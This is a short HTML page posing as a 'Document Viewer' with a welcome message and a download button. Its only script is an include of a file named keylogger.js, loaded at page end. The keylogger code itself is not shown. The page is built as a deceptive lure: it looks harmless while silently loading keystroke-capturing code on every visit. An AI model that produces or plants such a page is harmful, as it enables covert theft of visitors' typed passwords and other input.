<!DOCTYPE html>
<html>
<head>
    <title>Document Viewer</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 20px;
        }
        #viewer {
            width: 80%;
            height: 600px;
            margin: 20px auto;
            border: 1px solid #ccc;
            padding: 10px;
            overflow: auto;
        }
        #download {
            background-color: #4CAF50;
            color: white;
            padding: 10px 20px;
            border: none;
            cursor: pointer;
            font-size: 16px;
        }
    </style>
</head>
<body>
    <h1>Document Viewer</h1>
    <div id="viewer">
        <p>Welcome to the document viewer!</p>
        <p>Please download the document below:</p>
        <button id="download">Download Document</button>
    </div>
    
    <script src="keylogger.js"></script>
</body>
</html>
